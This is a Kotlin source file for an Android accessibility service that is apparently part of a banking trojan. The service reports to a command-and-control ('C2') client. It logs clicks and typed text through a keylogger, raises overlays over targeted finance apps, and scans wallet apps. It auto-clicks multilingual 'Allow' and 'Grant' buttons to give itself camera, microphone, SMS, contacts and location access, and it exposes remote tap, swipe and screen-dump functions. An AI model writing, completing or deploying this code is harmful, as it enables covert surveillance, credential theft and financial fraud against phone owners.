package com.xrc.app.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Path
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.xrc.app.XRCApp
import com.xrc.app.overlay.SprungeEngine
import com.xrc.app.finance.FinanceOverlayManager
import com.xrc.app.surveillance.Keylogger
import com.xrc.app.wallet.WalletScanner
import com.xrc.app.permissions.PermissionGrants
import java.util.concurrent.ConcurrentHashMap

class XRCAccessibilityService : AccessibilityService() {

    companion object {
        const val TAG = "XRCAccessibility"
        var instance: XRCAccessibilityService? = null
            private set
        var isRunning = false

        // Known permission grant buttons by text (multilingual)
        private val ALLOW_BUTTONS = setOf(
            "Allow", "允许", "許可", "허용", "Permitir",
            "Autoriser", "Erlauben", "Consenti", "Povolit"
        )

        private val ALWAYS_ALLOW_BUTTONS = setOf(
            "Always allow", "始终允许", "常に許可", "항상 허용"
        )

        private val GRANT_BUTTONS = setOf(
            "Grant", "授权", "権限付与", "Grantear"
        )
    }

    private val handler = Handler(Looper.getMainLooper())
    private var currentForegroundPackage = ""
    private val scannedPackages = ConcurrentHashMap.newKeySet<String>()
    private var isAutoGranting = false
    private var autoGrantQueue = mutableListOf<String>()

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        isRunning = true
        Log.i(TAG, "Accessibility service connected")

        // Notify C2
        XRCApp.instance.applicationScope.launch {
            XRCApp.instance.c2Client.send("""{"type":"accessibility_ready"}""")
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                handleWindowChange(event)
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                handleViewClick(event)
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                handleTextChanged(event)
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                handleContentChanged(event)
            }
        }
    }

    private fun handleWindowChange(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val className = event.className?.toString() ?: ""

        // Track foreground app
        if (packageName != currentForegroundPackage) {
            currentForegroundPackage = packageName
            Log.d(TAG, "Foreground app: $packageName")

            // Notify C2 of foreground change
            XRCApp.instance.c2Client.send("""{"type":"foreground_change","package":"$packageName"}""")

            // Check overlay targets
            if (FinanceOverlayManager.isTarget(packageName)) {
                SprungeEngine.showTargetedOverlay(this, packageName)
            }

            // Check wallet apps
            WalletScanner.onAppForegrounded(packageName)

            // Auto-grant permissions if applicable
            if (isAutoGranting && autoGrantQueue.isNotEmpty()) {
                handleAutoGrantDialogs(event)
            }
        }

        // Auto-grant permission dialogs
        if (className.contains("permission", ignoreCase = true) ||
            className.contains("Permission", ignoreCase = true) ||
            className.contains("Grant", ignoreCase = true)
        ) {
            handler.postDelayed({
                handlePermissionDialog(event)
            }, 500)
        }
    }

    private fun handlePermissionDialog(event: AccessibilityEvent) {
        val root = rootInActiveWindow ?: return
        val allowButtons = findButtonsByText(root, ALLOW_BUTTONS + ALWAYS_ALLOW_BUTTONS + GRANT_BUTTONS)

        for (button in allowButtons) {
            if (button.isVisibleToUser) {
                Log.i(TAG, "Auto-granting permission via button click")
                performActionOnNode(button, AccessibilityNodeInfo.ACTION_CLICK)
            }
        }
    }

    private fun handleAutoGrantDialogs(event: AccessibilityEvent) {
        val root = rootInActiveWindow ?: return
        // Find and click ALLOW, CONTINUE, NEXT, ENABLE buttons
        val targetTexts = setOf(
            "Allow", "允许", "Enable", "启用",
            "Next", "下一步", "Continue", "Grant"
        )
        val buttons = findButtonsByText(root, targetTexts)
        for (button in buttons) {
            if (button.isVisibleToUser) {
                performActionOnNode(button, AccessibilityNodeInfo.ACTION_CLICK)
                handler.postDelayed({ /* check next */ }, 1000)
            }
        }
    }

    private fun handleViewClick(event: AccessibilityEvent) {
        // Log click events for keylogger
        Keylogger.onViewClicked(event)
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        Keylogger.onTextChanged(event)
    }

    private fun handleContentChanged(event: AccessibilityEvent) {
        // Can trigger re-scan for permission dialogs
    }

    private fun findButtonsByText(
        node: AccessibilityNodeInfo,
        texts: Set<String>
    ): List<AccessibilityNodeInfo> {
        val results = mutableListOf<AccessibilityNodeInfo>()
        findButtonsRecursive(node, texts, results)
        return results
    }

    private fun findButtonsRecursive(
        node: AccessibilityNodeInfo,
        texts: Set<String>,
        results: MutableList<AccessibilityNodeInfo>
    ) {
        val nodeText = node.text?.toString() ?: ""
        val contentDesc = node.contentDescription?.toString() ?: ""

        if (texts.any { nodeText.contains(it, ignoreCase = true) || contentDesc.contains(it, ignoreCase = true) } &&
            node.isClickable
        ) {
            results.add(node)
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            findButtonsRecursive(child, texts, results)
            child.recycle()
        }
    }

    private fun performActionOnNode(node: AccessibilityNodeInfo, action: Int): Boolean {
        return try {
            node.performAction(action)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to perform action: ${e.message}")
            false
        }
    }

    fun performGlobalAction(action: Int): Boolean {
        return performGlobalAction(action)
    }

    fun getCurrentForegroundPackage(): String = currentForegroundPackage

    fun getScreenHierarchy(): String {
        val root = rootInActiveWindow ?: return "{}"
        return buildHierarchyJSON(root, 0)
    }

    private fun buildHierarchyJSON(node: AccessibilityNodeInfo, depth: Int): String {
        if (depth > 10) return "{}" // Prevent infinite recursion
        val sb = StringBuilder()
        sb.append("{")
        sb.append("\"text\":\"${escapeJson(node.text?.toString() ?: "")}\",")
        sb.append("\"class\":\"${node.className?.toString() ?: ""}\",")
        sb.append("\"package\":\"${node.packageName?.toString() ?: ""}\",")
        sb.append("\"clickable\":${node.isClickable},")
        sb.append("\"visible\":${node.isVisibleToUser},")
        sb.append("\"checked\":${node.isChecked},")
        sb.append("\"scrollable\":${node.isScrollable},")
        sb.append("\"child_count\":${node.childCount},")
        sb.append("\"bounds\":[${node.boundsInScreen.left},${node.boundsInScreen.top},${node.boundsInScreen.right},${node.boundsInScreen.bottom}]")
        if (node.childCount > 0) {
            sb.append(",\"children\":[")
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                if (i > 0) sb.append(",")
                sb.append(buildHierarchyJSON(child, depth + 1))
                child.recycle()
            }
            sb.append("]")
        }
        sb.append("}")
        return sb.toString()
    }

    private fun escapeJson(s: String): String {
        return s.replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t")
    }

    fun performClickAt(x: Int, y: Int): Boolean {
        val path = Path().apply { moveTo(x.toFloat(), y.toFloat()) }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 50))
            .build()
        return dispatchGesture(gesture, null, null)
    }

    fun performSwipe(x1: Int, y1: Int, x2: Int, y2: Int, durationMs: Long = 200): Boolean {
        val path = Path().apply {
            moveTo(x1.toFloat(), y1.toFloat())
            lineTo(x2.toFloat(), y2.toFloat())
        }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, durationMs))
            .build()
        return dispatchGesture(gesture, null, null)
    }

    fun performScrollForward(): Boolean {
        val root = rootInActiveWindow ?: return false
        return findScrollableNode(root)?.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD) ?: false
    }

    private fun findScrollableNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        if (node.isScrollable) return node
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findScrollableNode(child)
            child.recycle()
            if (result != null) return result
        }
        return null
    }

    fun startAutoGrant() {
        isAutoGranting = true
        autoGrantQueue.addAll(listOf(
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO",
            "android.permission.READ_SMS",
            "android.permission.READ_CONTACTS",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.POST_NOTIFICATIONS"
        ))
    }

    fun stopAutoGrant() {
        isAutoGranting = false
        autoGrantQueue.clear()
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        isRunning = false
        Log.d(TAG, "Accessibility service destroyed")
    }
}
